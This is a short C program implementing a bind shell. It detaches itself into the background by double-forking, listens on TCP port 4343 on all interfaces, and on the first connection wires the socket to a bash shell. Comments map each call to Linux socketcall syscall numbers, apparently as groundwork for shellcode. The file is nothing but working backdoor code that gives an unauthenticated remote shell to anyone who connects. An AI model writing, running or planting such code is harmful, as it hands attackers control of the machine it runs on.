#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

int	main()
{
	int resultfd, sockfd;
	int port = 4343;
	struct sockaddr_in my_addr;

	// syscall 102
	// int socketcall(int call, unsigned long *args);

	int child = fork();
	if (child == 0)
	{
		setsid();
		child = fork();
		if (child == 0)
		{

			// sycall socketcall (sys_socket 1)
			sockfd = socket(AF_INET, SOCK_STREAM, 0);

			// syscall socketcall (sys_setsockopt 14)
			int one = 1;
			setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

			// set struct values
			my_addr.sin_family = AF_INET; // 2
			my_addr.sin_port = htons(port); // port number
			my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

			// syscall socketcall (sys_bind 2)
			bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

			// syscall socketcall (sys_listen 4)
			listen(sockfd, 0);

			// syscall socketcall (sys_accept 5)
			resultfd = accept(sockfd, NULL, NULL);

			dup2(resultfd, 2);
			dup2(resultfd, 1);
			dup2(resultfd, 0);

			system("bash");	
		}
		else
			exit(0);
	}
	else
		exit(0);
    return (1);
}